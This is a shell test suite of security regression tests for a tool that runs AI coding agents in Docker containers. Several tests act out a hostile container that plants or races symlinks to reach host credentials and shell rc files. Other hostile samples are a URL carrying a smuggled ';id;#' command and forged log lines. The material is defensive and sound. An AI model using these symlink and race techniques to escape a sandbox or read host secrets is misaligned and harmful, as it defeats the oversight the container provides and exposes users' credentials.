  run cmd_run "$TEST_TEMP/project"
  assert_success
  assert_output --partial "is a symlink and was not read"
  run assert_docker_run_has "$cname" "GLOBAL_OK=1"
  assert_success
  run grep -q 'host-file-secret' "$DOCKER_CALLS"
  assert_failure
  run grep -q 'rc-secret' "$DOCKER_CALLS"
  assert_failure
}

# A regular .cleat.env passes the checks. The box swaps in a link before the
# open. The time bound's argv builder runs in that gap.
@test "regression v1.5.4: a project env file swapped for a link before its open is not read" {
  local p="$TEST_TEMP/project"
  mkdir -p "$p" "$TEST_TEMP/hostdir"
  printf 'SECRET_LINE=host-file-secret\n' > "$TEST_TEMP/hostdir/credentials"
  printf 'PLAIN=1\n' > "$p/.cleat.env"
  _R154_SWAP_F="$p/.cleat.env"
  _R154_SWAP_T="$TEST_TEMP/hostdir/credentials"
  eval "_r154_real_bounded_argv() $(declare -f _bounded_argv | sed 1d)"
  _bounded_argv() { rm -f "$_R154_SWAP_F"; ln -s "$_R154_SWAP_T" "$_R154_SWAP_F"; _r154_real_bounded_argv "$@"; }
  run _read_unlinked_bounded "$p/.cleat.env" 4096
  assert_success
  refute_output --partial "host-file-secret"
}

# The open went through a link, the box put a regular file back for the -L test
# and the link again for the listing. `ls -L` then named the file the
# descriptor held and the check passed.
@test "regression v1.5.4: the descriptor check lists the path without following it" {
  _R154_HELD="$TEST_TEMP/held"
  _R154_PATH="$TEST_TEMP/named"
  printf 'X=1\n' > "$_R154_HELD"
  printf 'Y=2\n' > "$_R154_PATH"
  exec 7<"$_R154_HELD"
  ls() {
    local last
    for last in "$@"; do :; done
    if [[ "$last" == "$_R154_PATH" ]]; then
      rm -f "$_R154_PATH"
      ln -s "$_R154_HELD" "$_R154_PATH"
    fi
    command ls "$@"
  }
  run _fd_holds_path 7 "$_R154_PATH"
  exec 7<&-
  unset -f ls
  assert_failure
}

# The prompt listed one read of .cleat.env and the host values came from
# another. The box adds a name while the user reads the prompt.
@test "regression v1.5.4: host variables apply from the same read the trust prompt showed" {
  unset CLEAT_TRUST_PROJECT
  local p="$TEST_TEMP/project"
  mkdir -p "$p"
  printf '[caps]\nenv\n' > "$CLEAT_GLOBAL_CONFIG"
  printf 'R154_SHOWN\n' > "$p/.cleat.env"
  export R154_SHOWN=shown-value R154_ADDED=added-value
  _R154_ENV="$p/.cleat.env"
  _is_tty() { return 0; }
  _trust_prompt() { printf 'R154_SHOWN\nR154_ADDED\n' > "$_R154_ENV"; return 0; }
  _BOX=main
  resolve_caps "$p" > "$TEST_TEMP/shownenv.out" 2>&1
  resolve_env_args "$p" >> "$TEST_TEMP/shownenv.out" 2>&1
  run printf '%s\n' "${_RESOLVED_ENV_ARGS[@]+"${_RESOLVED_ENV_ARGS[@]}"}"
  unset R154_SHOWN R154_ADDED
  assert_output --partial "R154_SHOWN=shown-value"
  refute_output --partial "added-value"
  run _trust_lookup "$p" main
  assert_output "$(_trust_decision_hash "" "R154_SHOWN")"
}

# The writers staged the new .cleat beside it as .cleat.cleat-tmp.<pid> (and
# .cleat.cleat-note.<pid>), opened with a plain redirect. The workspace is the
# box's, so it planted a link at every pid and the next `cleat config` wrote
# the new .cleat, box-authored sections included, into a host file such as
# ~/.zshenv.
@test "regression v1.5.4: a .cleat edit never writes through a link planted at its temp name" {
  local proj="$TEST_TEMP/proj" victim="$TEST_TEMP/host-zshenv"
  mkdir -p "$proj"
  printf 'export HOST=1\n' > "$victim"
  printf '[caps]\ngit\n' > "$proj/.cleat"
  ln -s "$victim" "$proj/.cleat.cleat-tmp.$$"
  ln -s "$victim" "$proj/.cleat.cleat-note.$$"
  _write_caps_to_file "$proj/.cleat" ssh
  _write_resources_to_file "$proj/.cleat" 4g ""
  _config_write_caps_scoped "$proj/.cleat" box.web.caps web git
  run cat "$victim"
  assert_output "export HOST=1"
  run cat "$proj/.cleat"
  assert_output --partial "memory = 4g"
  assert_output --partial "[box.web.caps]"
  assert_output --partial "# Per-box config"
}

# [[ -f ]] and `< "$file"` followed a link, and the rename then put the bytes
# back as a regular .cleat in /workspace: a box that planted
# .cleat -> ../../.aws/credentials read the secret after the next edit.
@test "regression v1.5.4: a .cleat linked to a host file is refused, never copied into the workspace" {
  local proj="$TEST_TEMP/proj" host="$TEST_TEMP/host-credentials"
  mkdir -p "$proj"
  printf '[default]\naws_secret_access_key = HOSTSECRET\n' > "$host"
  ln -s "$host" "$proj/.cleat"
  run _write_caps_to_file "$proj/.cleat" git
  assert_failure
  assert_output --partial "Refusing to edit"
  run _write_resources_to_file "$proj/.cleat" 4g ""
  assert_failure
  assert_output --partial "Refusing to edit"
  [ -L "$proj/.cleat" ] || { echo ".cleat is no longer the link"; return 1; }
  run grep -rl HOSTSECRET "$proj" "$CLEAT_CONFIG_DIR"
  assert_output ""
  run cat "$host"
  assert_output "$(printf '[default]\naws_secret_access_key = HOSTSECRET')"
}

# A dangling link fails [[ -f ]], so the generate row took .cleat as fresh and
# wrote its header with `> "$file"`, creating the link's target on the host.
@test "regression v1.5.4: generate never creates the file a dangling .cleat link names" {
  local proj="$TEST_TEMP/proj" target="$TEST_TEMP/host-new-file"
  mkdir -p "$proj"
  ln -s "$target" "$proj/.cleat"
  run _generate_project_cleat "$proj" 4g 2 git
  assert_failure
  [ ! -e "$target" ] || { echo "created: $(cat "$target")"; return 1; }
  [ -L "$proj/.cleat" ] || { echo ".cleat is no longer the link"; return 1; }
}

# Same shape in the .cleat.env scaffold: `[[ -f ]] && return`, then `cat >`
# through a dangling link.
@test "regression v1.5.4: the .cleat.env scaffold never creates the file a dangling link names" {
  local proj="$TEST_TEMP/proj" target="$TEST_TEMP/host-env-target"
  mkdir -p "$proj"
  ln -s "$target" "$proj/.cleat.env"
  run _scaffold_cleat_env "$proj"
  assert_success
  assert_output --partial "Not creating"
  [ ! -e "$target" ] || { echo "created: $(cat "$target")"; return 1; }
  [ -L "$proj/.cleat.env" ] || { echo ".cleat.env is no longer the link"; return 1; }
}

# `mv -f tmp .cleat` moves INTO a directory a link at .cleat names, so a box
# swapping one in after the checks had the new file dropped in any host
# directory. The move names the workspace directory instead, which renames onto
# the final name and never follows a link there. The swap runs at the stage's
# mktemp, the last step before the rename.
@test "regression v1.5.4: the rename lands on .cleat even when a link to a host directory is swapped in" {
  local proj="$TEST_TEMP/proj"
  _R154_HOSTDIR="$TEST_TEMP/host-dir"
  _R154_FLAG="$TEST_TEMP/swapped"
  _R154_CLEAT="$proj/.cleat"
  mkdir -p "$proj" "$_R154_HOSTDIR"
  printf '[caps]\ngit\n' > "$proj/.cleat"
  mktemp() {
    if [[ "$1" == "-d" && ! -e "$_R154_FLAG" ]]; then
      : > "$_R154_FLAG"
      command rm -f "$_R154_CLEAT"
      command ln -s "$_R154_HOSTDIR" "$_R154_CLEAT"
    fi
    command mktemp "$@"
  }
  run _write_caps_to_file "$proj/.cleat" ssh
  unset -f mktemp
  assert_success
  [ -e "$_R154_FLAG" ] || { echo "the swap never ran"; return 1; }
  run ls -A "$_R154_HOSTDIR"
  assert_output ""
  [ ! -L "$proj/.cleat" ] || { echo ".cleat is still the link"; return 1; }
  run cat "$proj/.cleat"
  assert_output --partial "ssh"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the project settings overlays were built with `[[ -f ]]` and a plain
# cp, jq or grep, and all of them follow a link. The workspace is the box's to
# write, so a link at .claude/settings.json, .claude/settings.local.json or
# .claude itself had the host copy any file the user can read into an overlay
# mounted into the box. No cap was needed: a cloned repo shipping the link was
# enough. Every arm fell back to a verbatim copy for a non-JSON target.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.4: a project settings file linked out of the workspace is never copied into the box" {
  mock_docker_images "cleat"
  : > "$CLEAT_GLOBAL_CONFIG"
  mkdir -p "$TEST_TEMP/project/.claude" "$TEST_TEMP/outside"
  printf 'FAKE-HOST-SECRET\n' > "$TEST_TEMP/outside/id_rsa"
  ln -s "$TEST_TEMP/outside/id_rsa" "$TEST_TEMP/project/.claude/settings.json"
  printf '{"permissions":{"allow":["Read"]}}\n' > "$TEST_TEMP/project/.claude/settings.local.json"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  assert_output --regexp 'settings\.json[^ ]{0,8} is a link or unreadable, so Cleat did not read it\.'
  refute_output --regexp 'settings\.local\.json[^ ]{0,8} is a link'
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
  assert_success
  run assert_docker_run_has "$cname" "/workspace/.claude/settings.local.json"
  assert_success
  run grep -rl FAKE-HOST-SECRET "$CLEAT_RUN_DIR/$cname"
  assert_failure
  run cat "$CLEAT_RUN_DIR/$cname/settings/project-settings.local.json"
  assert_output --partial '"Read"'
  run find "$CLEAT_RUN_DIR/$cname/settings" -name '.in.*'
  assert_output ""
}

@test "regression v1.5.4: a linked .claude directory is never read for project settings" {
  mock_docker_images "cleat"
  : > "$CLEAT_GLOBAL_CONFIG"
  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/hostclaude"
  # Valid JSON with no hooks: the plain copy arm.
  printf '{"env":{"TOKEN":"FAKE-HOST-SECRET"}}\n' > "$TEST_TEMP/hostclaude/settings.json"
  ln -s "$TEST_TEMP/hostclaude" "$TEST_TEMP/project/.claude"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  assert_output --partial "is a link or unreadable, so Cleat did not read it."
  run assert_docker_run_lacks "$cname" "/workspace/.claude/settings.json"
  assert_success
  run grep -rl FAKE-HOST-SECRET "$CLEAT_RUN_DIR/$cname"
  assert_failure
}

# The file passes the -f and -L checks. The box swaps in a link before the
# open. The time bound's argv builder runs in that gap.
@test "regression v1.5.4: a project settings file swapped for a link before its open is not copied" {
  mkdir -p "$TEST_TEMP/project/.claude" "$TEST_TEMP/outside" "$TEST_TEMP/snaps"
  printf 'FAKE-HOST-SECRET\n' > "$TEST_TEMP/outside/id_rsa"
  printf '{"model":"opus"}\n' > "$TEST_TEMP/project/.claude/settings.json"
  _R154_SWAP_F="$TEST_TEMP/project/.claude/settings.json"
  _R154_SWAP_T="$TEST_TEMP/outside/id_rsa"
  eval "_r154_real_bounded_argv() $(declare -f _bounded_argv | sed 1d)"
  _bounded_argv() { rm -f "$_R154_SWAP_F"; ln -s "$_R154_SWAP_T" "$_R154_SWAP_F"; _r154_real_bounded_argv "$@"; }
  _project_settings_snapshot "$TEST_TEMP/project" settings.json "$TEST_TEMP/snaps/s" || true
  [ -L "$_R154_SWAP_F" ] || { echo "the swap never ran"; return 1; }
  run grep -rl FAKE-HOST-SECRET "$TEST_TEMP/snaps"
  assert_failure
}

@test "regression v1.5.4: the hooks refresh writes empty settings for a linked project file, never its target" {
  command -v jq >/dev/null 2>&1 || skip "the refresh needs jq on the host"
  mkdir -p "$TEST_TEMP/project/.claude" "$TEST_TEMP/outside"
  printf 'PLANTED-HOST-SECRET\n' > "$TEST_TEMP/outside/secret"
  local cname="c2-refresh-link" dir
  dir="$CLEAT_RUN_DIR/$cname/settings"
  mkdir -p "$dir"
  # As a mounted overlay would be: the box plants the link beside it.
  printf '{}\n' > "$dir/settings.json"
  printf '{"old":1}\n' > "$dir/project-settings.json"
  ln -s "$TEST_TEMP/outside/secret" "$TEST_TEMP/project/.claude/settings.json"
  ACTIVE_CAPS=(hooks)
  run _refresh_settings_overlays "$cname" "$TEST_TEMP/project"
  run cat "$dir/project-settings.json"
  assert_output "{}"
  run grep -rl PLANTED-HOST-SECRET "$CLEAT_RUN_DIR/$cname"
  assert_failure
}

# cmd_run builds a fork box's overlays from its own copy since v1.4.0, but the
# refresh at every start, resume and `cleat claude` still read the live tree.
@test "regression v1.5.4: a fork box's settings refresh reads its own copy, not the origin tree" {
  command -v jq >/dev/null 2>&1 || skip "the refresh needs jq on the host"
  local cname="c2-refresh-fork" dir fork
  dir="$CLEAT_RUN_DIR/$cname/settings"
  mkdir -p "$dir" "$TEST_TEMP/project/.claude"
  printf '{}\n' > "$dir/settings.json"
  printf '{"old":1}\n' > "$dir/project-settings.json"
  _fork_mark "$cname"
  fork="$(_fork_dir "$cname")"
  mkdir -p "$fork/.claude"
  printf '{"permissions":{"allow":["FORK"]}}\n' > "$fork/.claude/settings.json"
  printf '{"permissions":{"allow":["LIVE"]}}\n' > "$TEST_TEMP/project/.claude/settings.json"
  ACTIVE_CAPS=(hooks)
  run _refresh_settings_overlays "$cname" "$TEST_TEMP/project"
  run jq -r '.permissions.allow[0]' "$dir/project-settings.json"
  assert_output "FORK"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the per-project input history was bind-mounted from
# ~/.claude/projects/<key>/history.jsonl, a name inside the session dir that
# every box of the project mounts read-write. The box could swap it for a
# relative link (from there ../../../ is $HOME, no host path needed), and the
# next recreate or start followed it: cmd_run's bare touch re-stamped the file
# the link named or created the file a dangling one named, and the bind then
# mounted that host file read-write into the box. The store is host-only now,
# and a box created before the move is recreated once on its next start or
# resume, because only a recreate changes a recorded bind source.
# ─────────────────────────────────────────────────────────────────────────────
_h154_fixture() {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  H154_CN="$(container_name_for "$TEST_TEMP/project")"
  H154_KEY="$(_derive_project_session_key "$TEST_TEMP/project")"
  H154_S="$HOME/.claude/projects/$H154_KEY"
  H154_STORE="$CLEAT_HISTORY_DIR/$H154_KEY/history.jsonl"
  mkdir -p "$H154_S"
}

# A stopped box created before the store: its recorded history source is the
# name inside its recorded session-dir source.
_h154_legacy_box() {
  _h154_fixture
  export DOCKER_STUB_STRICT=1
  mkdir -p "$CLEAT_RUN_DIR/$H154_CN/settings"
  echo '{}' > "$CLEAT_RUN_DIR/$H154_CN/settings/settings.json"
  printf '{"display":"old-line"}\n' > "$H154_S/history.jsonl"
  is_running() { return 1; }
  mock_docker_ps_a "$H154_CN"
  mock_docker_inspect "$(printf 'H%s\nS%s\n' "$H154_S/history.jsonl" "$H154_S")"
}

# The H and S inspect lines for the box the last recorded `docker run` of $1
# created, so a restart is judged on the mounts cmd_run really passed.
_h154_inspect_from_run() {
  local line tok prev="" src rest dst out=""
  line="$(grep "^docker run " "$DOCKER_CALLS" | grep -- "$1" | tail -1)"
  set -f
  for tok in $line; do
    if [ "$prev" = "-v" ]; then
      src="${tok%%:*}"
      rest="${tok#*:}"
      dst="${rest%%:*}"
      case "$dst" in
        /home/coder/.claude/history.jsonl) out="${out}H${src}"$'\n' ;;
        /home/coder/.claude/projects/-workspace) out="${out}S${src}"$'\n' ;;
      esac
    fi
    prev="$tok"
  done
  set +f
  printf '%s' "$out"
}

@test "regression v1.5.4: the history bind source is host-only, not in the session dir" {
  _h154_fixture
  export DOCKER_STUB_STRICT=1
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
  assert_success
  run assert_docker_run_lacks "$H154_CN" "$H154_S/history.jsonl:"
  assert_success
  [ -f "$H154_STORE" ] && [ ! -L "$H154_STORE" ] || { echo "the store is not a regular file"; return 1; }
  [ ! -e "$H154_S/history.jsonl" ] || { echo "cmd_run wrote a history file in the session dir"; return 1; }
}

@test "regression v1.5.4: a history link planted in the session dir is never followed" {
  _h154_fixture
  printf 'SECRET\n' > "$HOME/secret"
  touch -t 200001010000 "$HOME/secret"
  local before
  before="$(_path_mtime "$HOME/secret")"
  ln -s ../../../secret "$H154_S/history.jsonl"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run cat "$HOME/secret"
  assert_output "SECRET"
  run _path_mtime "$HOME/secret"
  assert_output "$before"
  [ -f "$H154_STORE" ] && [ ! -L "$H154_STORE" ] || { echo "the store is not a regular file"; return 1; }
  run grep -c SECRET "$H154_STORE"
  assert_output "0"
  [ ! -e "$H154_S/history.jsonl" ] && [ ! -L "$H154_S/history.jsonl" ] \
    || { echo "the planted link is still in the session dir"; return 1; }
}

@test "regression v1.5.4: a dangling history link in the session dir creates no host file" {
  _h154_fixture
  ln -s ../../../created-by-cleat "$H154_S/history.jsonl"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  [ ! -e "$HOME/created-by-cleat" ] || { echo "cmd_run created the file the link named"; return 1; }
  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
  assert_success
}

@test "regression v1.5.4: cmd_start recreates a box whose history bind is in its session dir" {
  _h154_legacy_box
  run cmd_start "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Recreating container"
  assert_output --partial "host paths changed"
  run docker_calls
  assert_output --partial "docker rm -f $H154_CN"
  refute_output --partial "docker start $H154_CN"
  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
  assert_success
  # The recreate carried the box's history over, and left no name behind.
  run cat "$H154_STORE"
  assert_output '{"display":"old-line"}'
  [ ! -e "$H154_S/history.jsonl" ] || { echo "the old history file is still in the session dir"; return 1; }
}

@test "regression v1.5.4: cmd_resume recreates a box whose history bind is in its session dir" {
  _h154_legacy_box
  run cmd_resume "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Recreating container"
  assert_output --partial "host paths changed"
  run docker_calls
  assert_output --partial "docker rm -f $H154_CN"
  refute_output --partial "docker start $H154_CN"
  run assert_docker_run_has "$H154_CN" "$H154_STORE:/home/coder/.claude/history.jsonl"
  assert_success
  run cat "$H154_STORE"
  assert_output '{"display":"old-line"}'
}

# The recreate must happen once. The second start is judged on the mounts the
# first one's cmd_run really recorded, through both verbs.
@test "regression v1.5.4: a box on the host-only history store restarts without a recreate" {
  _h154_legacy_box
  run cmd_start "$TEST_TEMP/project"
  assert_output --partial "Recreating container"
  run _h154_inspect_from_run "$H154_CN"
  assert_line "H$H154_STORE"
  assert_line "S$H154_S"
  mock_docker_inspect "$(_h154_inspect_from_run "$H154_CN")"
  : > "$DOCKER_CALLS"
  run cmd_start "$TEST_TEMP/project"
  assert_success
  refute_output --partial "Recreating"
  run docker_calls
  assert_output --partial "docker start $H154_CN"
  refute_output --partial "docker rm -f $H154_CN"
  : > "$DOCKER_CALLS"
  run cmd_resume "$TEST_TEMP/project"
  assert_success
  refute_output --partial "Recreating"
  run docker_calls
  assert_output --partial "docker start $H154_CN"
  refute_output --partial "docker rm -f $H154_CN"
}

# ~/.claude/history.jsonl is the nested bind TARGET, pre-created for VirtioFS.
# `touch` on it followed a link there, like the source's touch did.
@test "regression v1.5.4: the nested history target is never touched through a link" {
  _h154_fixture
  printf 'SECRET\n' > "$HOME/secret"
  touch -t 200001010000 "$HOME/secret"
  local before
  before="$(_path_mtime "$HOME/secret")"
  ln -s ../secret "$HOME/.claude/history.jsonl"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  run _path_mtime "$HOME/secret"
  assert_output "$before"
  _container_has_kit_mounts() { return 1; }
  run _ensure_host_mount_targets "$H154_CN"
  assert_success
  run _path_mtime "$HOME/secret"
  assert_output "$before"
  run cat "$HOME/secret"
  assert_output "SECRET"
  # A dangling link there never becomes a new host file.
  rm -f "$HOME/.claude/history.jsonl"
  ln -s ../made-by-cleat "$HOME/.claude/history.jsonl"
  run _ensure_host_mount_targets "$H154_CN"
  [ ! -e "$HOME/made-by-cleat" ] || { echo "the start created the file the link named"; return 1; }
  # With nothing there, both paths still create the target VirtioFS needs.
  rm -f "$HOME/.claude/history.jsonl"
  run _ensure_host_mount_targets "$H154_CN"
  [ -f "$HOME/.claude/history.jsonl" ] && [ ! -L "$HOME/.claude/history.jsonl" ] \
    || { echo "the start did not create the target"; return 1; }
  rm -f "$HOME/.claude/history.jsonl"
  run cmd_run "$TEST_TEMP/project"
  assert_success
  [ -f "$HOME/.claude/history.jsonl" ] && [ ! -L "$HOME/.claude/history.jsonl" ] \
    || { echo "cmd_run did not create the target"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.4: the browser bridge's log lived in the clip dir, which the box mounts
# read-write, and every write to it followed a link: the watcher's `>>`, the
# callback proxy's own log lines, socat's `2>>` and python's open(). v1.5.0
# re-checked the path once per claimed URL, but a box that renames a fresh
# link over it in a loop wins any gap a check leaves, so URL lines of its
# choosing still landed in any host file the user can write, a shell rc file
# included. The log and the callback proxy's readiness marker now live in
# bridge/, a sibling of the clip dir that no mount contains.
# ─────────────────────────────────────────────────────────────────────────────

# Wait for a basic regex to appear in a file. $1 = file, $2 = pattern.
_v154_bw_wait_for() {
  local i=0
  while [ "$i" -lt 20 ]; do
    grep -q "$2" "$1" 2>/dev/null && return 0
    sleep 0.2
    i=$((i + 1))
  done
  return 1
}

@test "regression v1.5.4: a proxy log link the box keeps re-planting never receives a line from the watcher or the callback proxy" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  # Hardcoded rather than read from the helper, so a mutated helper cannot
  # redirect this test's own read.
  local log="$TEST_TEMP/bridge/proxy-log"
  printf 'echo original\n' > "$TEST_TEMP/fake-rc"
  _extract_callback_port() { echo "1455"; return 0; }
  _port_in_use() { return 1; }
  # The proxy child writes to the log itself, after the readiness wait, which
  # is the window the per-claim check never covered.
  _auth_callback_proxy() {
    echo "[proxy x] starting" >> "$3"
    : > "$4"
    sleep 2
    echo "[proxy x] exited" >> "$3"
  }
  _browser_watcher "$dir" "true" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  ( while :; do
      ln -sf "$TEST_TEMP/fake-rc" "$dir/.pl.tmp" 2>/dev/null
      mv -f "$dir/.pl.tmp" "$dir/.proxy-log" 2>/dev/null
      sleep 0.05
    done ) &
  local lpid=$!

  # The waits never fail the test on their own: the host file is the property,
  # so it is checked first even when the lines went somewhere else.
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  _v154_bw_wait_for "$log" "opening URL" || true
  printf '%s' "https://auth.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback;id;#" > "$dir/.browser-open"
  _v154_bw_wait_for "$log" "$_BROWSER_BLOCKED_MARK origin=auth.example.com" || true
  printf '%s' "https://docs.python.org/3/library/" > "$dir/.browser-open"
  _v154_bw_wait_for "$log" "deferring URL" || true
  _v154_bw_wait_for "$log" "proxy x. exited" || true

  kill "$lpid" 2>/dev/null || true; wait "$lpid" 2>/dev/null || true
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true

  run cat "$TEST_TEMP/fake-rc"
  assert_output "echo original"
  run cat "$log"
  assert_output --partial "extracted callback port=1455"
  assert_output --partial "opening URL on host"
  assert_output --partial "$_BROWSER_BLOCKED_MARK origin=auth.example.com"
  assert_output --partial "deferring URL to terminal"
  assert_output --partial "[proxy x] starting"
  assert_output --partial "[proxy x] exited"
}

@test "regression v1.5.4: with no state dir outside the mount a faked readiness marker never starts the proxy or opens the browser" {
  # A regular file where the bridge state dir would go, so it cannot be made.
  # The readiness marker is then refused, never put in the clip dir, where the
  # box could create it (an open with no listener) or point it at a host file.
  # The claim dir stays usable. Without it the whole browser bridge is off (see
  # the claim dir regression further down) and this path is never reached.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  : > "$TEST_TEMP/bridge"
  cat > "$TEST_TEMP/fake_open" <<OPEN
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
OPEN
  chmod +x "$TEST_TEMP/fake_open"
  _extract_callback_port() { echo "1455"; return 0; }
  _port_in_use() { return 1; }
  # Never writes the marker: only the box's fake could make it appear.
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; sleep 5; }
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  # The watcher's $$ is this shell's $$, so this is the name it would poll.
  ( while :; do : > "$dir/.proxy-ready.$$" 2>/dev/null; sleep 0.05; done ) &
  local lpid=$!
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  sleep 3
  kill "$lpid" 2>/dev/null || true; wait "$lpid" 2>/dev/null || true
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true

  [ ! -e "$TEST_TEMP/proxy_started" ] || {
    echo "REGRESSION: the callback proxy started with its marker inside the mount"; return 1; }
  [ ! -e "$TEST_TEMP/opened.log" ] || {
    echo "REGRESSION: a readiness marker the box faked opened the browser"; return 1; }
}

@test "regression v1.5.4: a refusal line the box writes into its clip dir is never reported at session end" {
  # The report reads the host-only log. A line the box forges in its own clip
  # dir, where the log used to be, must never reach the terminal.
  _host_open_cmd() { echo ""; }
  mkdir -p "$CLEAT_RUN_DIR/test-ctr/clip" "$CLEAT_RUN_DIR/test-ctr/bridge"
  docker() {
    if [ "${1:-}" = exec ] && [ "${2:-}" = -it ]; then
      printf '[browser-watcher 10:00:00] %s origin=evil.example url=https://evil.example/oauth/authorize?redirect_uri=x\n' \
        "$_BROWSER_BLOCKED_MARK" >> "$CLEAT_RUN_DIR/test-ctr/clip/.proxy-log"
      printf '[browser-watcher 10:00:00] %s origin=auth.example.com url=https://auth.example.com/oauth/authorize?redirect_uri=x\n' \
        "$_BROWSER_BLOCKED_MARK" >> "$CLEAT_RUN_DIR/test-ctr/bridge/proxy-log"
    fi
    command docker "$@"
  }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "evil.example"
}

# ── v1.5.4: the watcher log leaves the mount, and its cap rotates by rename ──
#
# The watcher log lived at clip/.watcher-log, inside the clip dir the box has
# read-write. The cap dropped a link once, then `[ -f ]`, `wc -c <` and `: >`
# each looked the name up again, so a link swapped in after the drop had the cap
# empty any host file over 1 MB. And every watcher spawn opened the name again
# for `>>` with no check at all, so a link planted after the cap sent watcher
# output into a host file the box chose, created if missing. The log now lives
# at logs/watcher.log beside clip/, never mounted, and the cap sizes by stat and
# rotates an oversized log by rename into a host-only dir.

# Swaps the log for another shape right after the real pre-filter, which is the
# window the box had. $_WL_SWAP names the shape: a link to $_WL_VICTIM or a FIFO.
_wl_swap_after_drop() {
  eval "_wl_real_drop_unless_regular() $(declare -f _drop_unless_regular | sed 1d)"
  _drop_unless_regular() {
    _wl_real_drop_unless_regular "$@"
    rm -f "$1"
    case "$_WL_SWAP" in
      link) ln -s "$_WL_VICTIM" "$1" ;;
      fifo) mkfifo "$1" ;;
    esac
  }
}

@test "regression v1.5.4: capping a watcher log never truncates through a link swapped in after the check" {
  local clip="$TEST_TEMP/wl/clip" claim="$TEST_TEMP/wl/clipclaim"
  mkdir -p "$clip"
  head -c 1200000 /dev/zero | tr '\0' 'x' > "$clip/.proxy-log"
  _WL_VICTIM="$TEST_TEMP/wl-victim"
  head -c 1200000 /dev/zero | tr '\0' 'v' > "$_WL_VICTIM"
  _WL_SWAP=link
  _wl_swap_after_drop
  run _cap_watcher_log "$clip/.proxy-log" "$claim"
  assert_success
  assert_output "0"
  local sz; sz="$(wc -c < "$_WL_VICTIM" | tr -d '[:space:]')"
  [ "$sz" -eq 1200000 ] || fail "the cap emptied the file a swapped-in link named: $sz bytes left"
  # The link itself was moved away and deleted, never written through.
  run test -L "$clip/.proxy-log"
  assert_failure
  run ls -A "$claim"
  assert_output ""
}

@test "regression v1.5.4: a FIFO swapped in after the check never blocks the watcher log cap" {
  local clip="$TEST_TEMP/wl/clip" out="$TEST_TEMP/wl-out" pid i=0
  mkdir -p "$clip"
  echo "prior" > "$clip/.watcher-log"
  _WL_SWAP=fifo
  _wl_swap_after_drop
  ( _cap_watcher_log "$clip/.watcher-log" "$TEST_TEMP/wl/claim" > "$out" 2>/dev/null ) 3>&- &
  pid=$!
  while [ "$i" -lt 50 ] && kill -0 "$pid" 2>/dev/null; do
    sleep 0.1
    i=$(( i + 1 ))
  done
  if kill -0 "$pid" 2>/dev/null; then
    # Release the blocked reader so the test process is not left hanging.
    _portable_timeout 5 bash -c ': > "$1"' _ "$clip/.watcher-log" || true
    wait "$pid" 2>/dev/null || true
    fail "the cap blocked on a FIFO swapped in after its pre-filter"
  fi
  wait "$pid" 2>/dev/null || true
  run cat "$out"
  assert_output "0"
}

# The spawn half. After the cap has run, the box plants a link at the old
# in-mount log name, and the session's interactive exec waits until one of the
# two possible logs exists, so every watcher's `>>` has opened before the
# session ends. Shared by the exec_claude, cmd_shell and cmd_login tests.
_wl_cap_then_plant() {
  _wl_real_cap_watcher_log "$@"
  rm -f "$_WL_CLIP/.watcher-log"
  ln -s "$_WL_VICTIM" "$_WL_CLIP/.watcher-log"
}
_wl_session_exec_waits() {
  local i=0
  if [ "${1:-}" = exec ] && [ "${2:-}" = -it ]; then
    while [ "$i" -lt 50 ] && [ ! -e "$_WL_VICTIM" ] && [ ! -e "$_WL_HOSTLOG" ]; do
      sleep 0.1
      i=$(( i + 1 ))
    done
  fi
  command docker "$@"
}
_wl_arm_spawn_link() {
  eval "_wl_real_cap_watcher_log() $(declare -f _cap_watcher_log | sed 1d)"
  _cap_watcher_log() { _wl_cap_then_plant "$@"; }
  docker() { _wl_session_exec_waits "$@"; }
}

@test "regression v1.5.4: session watchers never append through a link in the clip dir" {
  local cname="wl-spawn-ctr"
  local rd="$HOME/.config/cleat/run/${cname}"
  mkdir -p "$rd/clip"
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  cat > "$TEST_TEMP/wl_spawner.sh" <<EOF
source "$TEST_TEMP/cli_stripped"
_WL_CLIP="$rd/clip"
_WL_VICTIM="$TEST_TEMP/host-victim"
_WL_HOSTLOG="$rd/logs/watcher.log"
